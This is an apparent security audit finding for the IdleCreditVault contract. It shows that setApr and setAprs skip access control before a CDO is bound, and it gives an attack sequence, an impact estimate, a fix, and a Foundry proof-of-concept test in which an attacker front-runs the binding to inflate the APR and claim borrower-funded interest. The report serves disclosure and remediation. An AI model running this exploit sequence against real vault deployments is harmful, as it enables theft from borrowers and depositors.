### Title
Unauthenticated callers can seize the strategy APR before CDO binding - (File: `contracts/strategies/idle/IdleCreditVault.sol`)

### Summary
`IdleCreditVault.setApr` skips its caller check whenever `idleCDO` is unset, allowing any unprivileged caller to set the strategy APR during the deployment window. [1](#0-0)  `setAprs` and `setAprsWithBuffer` expose the same pre-binding write path while also updating `unscaledApr`. [2](#0-1) 

### Finding Description
Before `setWhitelistedCDO` binds the strategy to its CDO, `idleCDO == address(0)`, so `setApr` never validates `msg.sender`. [3](#0-2)  The only remaining check is the `maxApr` bound, which still permits a value as high as `DEFAULT_MAX_APR` (`20e18`, i.e. 20% APR). [4](#0-3) [5](#0-4) 

An attacker can front-run the owner’s CDO-binding transaction and call `setAprs(20e18, 20e18)`. When the owner subsequently initializes `IdleCDOEpochVariant`, `_additionalInit` reads the corrupted `getApr()` and writes it back through `_setScaledApr`, preserving the attacker-selected rate. [6](#0-5)  The later `setWhitelistedCDO` call closes the access-control window but does not validate or reset the previously installed APR. [7](#0-6) 

The attack occurs during the buffer phase before the first epoch in fixed-APR mode:

1. Honest owner deploys and initializes `IdleCreditVault` with the intended APR.
2. An unprivileged attacker calls `setAprs(20e18, 20e18)` while `idleCDO` is still zero.
3. Honest owner deploys `IdleCDOEpochVariant`; its initializer propagates the corrupted APR.
4. Honest owner calls `setWhitelistedCDO`, preventing further attacker calls.
5. A KYC-passing attacker deposits and submits a withdrawal request.
6. Honest owner or manager starts the epoch, transferring principal to the honest borrower. [8](#0-7) 
7. At epoch end, `stopEpoch` pulls the inflated expected interest from the borrower and funds the attacker’s withdrawal receipt. [9](#0-8) 
8. The attacker claims principal plus attacker-selected interest through the normal withdrawal-claim flow. [10](#0-9) 

### Impact Explanation
The attacker can force the honest borrower to pay up to the configured 20% APR cap instead of the intended APR. For a 1,000,000-USDC vault and a 30-day epoch, the excess is approximately `1,000,000 * 20% * 30 / 365 = 16,438 USDC`, before fees and proportional ownership adjustments. A KYC-passing attacker controlling the vault’s liquidity receives that excess through the ordinary claim mechanism.

This breaks fair mint/burn and access-control invariants: an unauthorized caller changes the borrower-facing interest rate, while the protocol later treats the resulting receipts as legitimate funded claims. If the borrower cannot or does not fund the inflated amount, the same sequence can instead drive the vault into the default path and freeze withdrawals.

### Likelihood Explanation
Exploitation requires a non-atomic deployment or migration sequence in which the strategy is initialized but `setWhitelistedCDO` has not yet been called. The provided factory deploys, configures, and binds the strategy in one transaction, including an explicit APR overwrite, so vaults deployed through that exact atomic path are not exposed. [11](#0-10) [12](#0-11)  Manual, scripted, upgraded, or replacement deployments that split initialization and CDO binding across transactions remain exploitable by any observer.

### Recommendation
Do not skip authorization when `idleCDO` is unset. Require `msg.sender` to be `owner()` or `manager` until a CDO is bound:

```solidity
// contracts/strategies/idle/IdleCreditVault.sol
function setApr(uint256 _apr) public {
    address _cdo = idleCDO;
    if (_cdo == address(0)) {
        if (msg.sender != owner() && msg.sender != manager) revert NotAllowed();
    } else if (msg.sender != _cdo && msg.sender != manager) {
        revert NotAllowed();
    }

    uint256 _maxApr = maxApr;
    if (_maxApr != 0 && _apr > _maxApr) revert NotAllowed();
    lastApr = _apr;
}
```

Prefer binding the CDO atomically during initialization, or add an explicit `initializeAprAndBindCDO` step callable only by the owner. Deployment procedures should also assert the expected `lastApr`, `unscaledApr`, and `idleCDO` immediately after binding.

// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/proxy/transparent/ProxyAdmin.sol";
import "@openzeppelin/contracts/proxy/transparent/TransparentUpgradeableProxy.sol";

import "../../contracts/IdleCDOCreditVault.sol";
import "../../contracts/IdleCDOEpochVariant.sol";
import "../../contracts/interfaces/IERC20Detailed.sol";
import "../../contracts/strategies/idle/IdleCreditVault.sol";

contract PreBindingAprTakeoverPoC is Test {
    IERC20Detailed constant USDC =
        IERC20Detailed(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);

    address owner = makeAddr("owner");
    address manager = makeAddr("manager");
    address borrower = makeAddr("borrower");
    address attacker = makeAddr("attacker");

    ProxyAdmin proxyAdmin;
    IdleCreditVault strategy;
    IdleCDOEpochVariant cdo;

    uint256 constant DEPOSIT = 1_000_000e6;
    uint256 constant INTENDED_APR = 5e18;   // 5%
    uint256 constant ATTACKER_APR = 20e18;  // 20%, still within DEFAULT_MAX_APR

    function setUp() public {
        vm.createSelectFork("mainnet");
        proxyAdmin = new ProxyAdmin();
    }

    function testUnboundStrategyAprTakeover() public {
        // Honest owner deploys the strategy proxy.
        IdleCreditVault strategyImpl = new IdleCreditVault();
        strategy = IdleCreditVault(address(new TransparentUpgradeableProxy(
            address(strategyImpl),
            address(proxyAdmin),
            abi.encodeWithSelector(
                IdleCreditVault.initialize.selector,
                address(USDC),
                owner,
                manager,
                borrower,
                "Borrower",
                INTENDED_APR
            )
        )));

        // Attacker front-runs the CDO binding. idleCDO is still zero, so no
        // caller check is performed.
        vm.prank(attacker);
        strategy.setAprs(ATTACKER_APR, ATTACKER_APR);
        assertEq(strategy.getApr(), ATTACKER_APR);
        assertEq(strategy.unscaledApr(), ATTACKER_APR);

        // Honest owner deploys the CDO. Its initializer propagates getApr().
        IdleCDOEpochVariant cdoImpl = new IdleCDOEpochVariant();
        cdo = IdleCDOEpochVariant(address(new TransparentUpgradeableProxy(
            address(cdoImpl),
            address(proxyAdmin),
            abi.encodeWithSelector(
                IdleCDOCreditVault.initialize.selector,
                0,
                address(USDC),
                owner,
                owner,
                address(0),
                address(strategy),
                100_000
            )
        )));

        vm.startPrank(owner);
        strategy.setWhitelistedCDO(address(cdo));
        cdo.setEpochParams(30 days, 1 days);
        cdo.setKeyringParams(address(0), 1); // open in-test KYC policy
        vm.stopPrank();

        // The corrupted APR survives binding.
        assertEq(strategy.getApr(), ATTACKER_APR);
        assertEq(strategy.unscaledApr(), ATTACKER_APR);

        // KYC-passing attacker becomes the LP and queues a full withdrawal.
        deal(address(USDC), attacker, DEPOSIT);
        vm.startPrank(attacker);
        USDC.approve(address(cdo), type(uint256).max);
        cdo.depositAA(DEPOSIT);
        uint256 requested = cdo.requestWithdraw(0, cdo.AATranche());
        vm.stopPrank();

        // The fixed-APR withdrawal receipt already exceeds principal.
        assertGt(requested, DEPOSIT);

        // Honest borrower can cover the inflated interest, avoiding the default path.
        uint256 borrowerTopUp = requested - DEPOSIT + 1e6;
        deal(address(USDC), borrower, borrowerTopUp);
        vm.prank(borrower);
        USDC.approve(address(cdo), type(uint256).max);

        vm.prank(owner);
        cdo.startEpoch();

        vm.warp(cdo.epochEndDate() + 1);
        vm.prank(manager);
        cdo.stopEpoch(0, 0);

        uint256 before = USDC.balanceOf(attacker);
        vm.prank(attacker);
        cdo.claimWithdrawRequest();
        uint256 claimed = USDC.balanceOf(attacker) - before;

        // Attacker recovers principal plus the borrower-funded inflated APR.
        assertGt(claimed, DEPOSIT);
        assertEq(claimed, requested);
    }
}
